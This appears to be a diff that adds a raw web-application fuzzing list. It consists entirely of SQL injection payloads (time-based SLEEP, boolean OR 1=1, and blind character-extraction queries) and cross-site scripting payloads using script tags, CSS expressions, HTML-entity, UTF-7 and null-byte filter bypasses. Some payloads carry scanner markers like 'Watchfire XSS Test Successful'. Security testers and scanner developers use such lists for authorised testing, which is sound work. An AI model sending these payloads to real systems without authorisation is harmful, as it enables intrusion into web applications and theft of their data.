@@ -1,0 +1,26 @@
+-1'OR 17-7=10
+'+(SELECT 1 FROM (SELECT SLEEP(25))A)+'
+-1 or 1=(SELECT 1 FROM (SELECT SLEEP(25))A)
+'"--></style></script><script>alert(0x000042)</script>
+" stYle="x:expre/**/ssion(alert(9))
+-1 OR 1=1 AND 1=(SELECT IF((IFNULL(ASCII(SUBSTRING((SELECT CONCAT(CHAR(78),CHAR(69),CHAR(84),CHAR(83),CHAR(80),CHAR(65),CHAR(82),CHAR(75),CHAR(69),CHAR(82))),5,1)),0)=88),1,2))-- 
+<td>--><script>alert(21812)</script></td>
+'or 1=(SELECT IF((IFNULL(ASCII(SUBSTRING((SELECT CONCAT(CHAR(78),CHAR(69),CHAR(84),CHAR(83),CHAR(80),CHAR(65),CHAR(82),CHAR(75),CHAR(69),CHAR(82))),5,1)),0)=88),1,2))
+<td><font color="#F00">--><script>alert(21812)</script></font></td>
+<td width="682"><font color="#0000FF"size="+1"><strong>>"><script>alert(20292)</script></strong></font></td>
+
+'>%22%27><img%20src%3d%22javascript:alert(17792)%22>'
+</TextArea><script>alert('Watchfire XSS Test Successful')</script>
+>"'><img src=&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;alert
+&quot;Watchfire&#x20;XSS&#x20;Test&#x20;Successful&quot;)>
+>'><%00script>alert('Watchfire XSS Test Successful')</script>
+>+ACI-+AD4-+ADw-SCRIPT+AD4-alert(1234)+ADw-/SCRIPT+AD4-
+%A7%A2%BE%Bc%F3%E3%F2%E9%F0%F4%Be%E1%Ec%E5%F2%F4%A8%A7Watchfire%20XSS%20Test%20Successful%A7%A9%Bc%Af%F3%E3%F2%E9%F0%F4%Be
+
+
+
+
+admin' and sleep(12)='
+
+
+
